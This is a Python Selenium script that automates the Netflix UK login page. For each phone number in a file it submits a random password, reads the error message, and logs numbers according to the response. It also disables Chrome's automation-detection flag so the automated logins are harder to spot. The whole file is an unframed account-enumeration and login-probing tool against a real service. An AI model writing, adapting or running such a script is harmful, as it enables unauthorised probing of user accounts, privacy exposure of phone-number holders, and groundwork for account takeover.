import selenium
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver import ActionChains
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import selenium.webdriver.chrome.options
from selenium.webdriver.chrome.options import Options
import time
import random

PATH = "C:\Program Files (x86)\chromedriver.exe"

options = webdriver.ChromeOptions()
options.add_argument("--disable-blink-features=AutomationControlled")
options.add_argument("--disable-user-media-security=true")
options.add_argument("--use-fake-ui-for-media-stream")
options.add_argument("--disable-popup-blocking")

driver = webdriver.Chrome(PATH, options=options)
action = ActionChains(driver)
file = open('numbers.txt','r')
file1= open('numbers1.txt','w')
for number in file:
    number1=number[2:]
    driver.get("https://www.netflix.com/gb/login")
    driver.maximize_window()
    time.sleep(3)
    data = driver.find_element_by_id("id_userLoginId")
    password = driver.find_element_by_id("id_password")
    data.send_keys(number1)
    password1 = random.randint(1000,99999999)
    password.send_keys(password1)
    driver.find_element_by_class_name("login-button").click()
    time.sleep(3)
    element = driver.find_element_by_class_name("ui-message-contents")

    if element.text != "Incorrect password. Please try again or you can reset your password.":
        file1.write(number)
    else:
        pass
    time.sleep(3)
file1.close()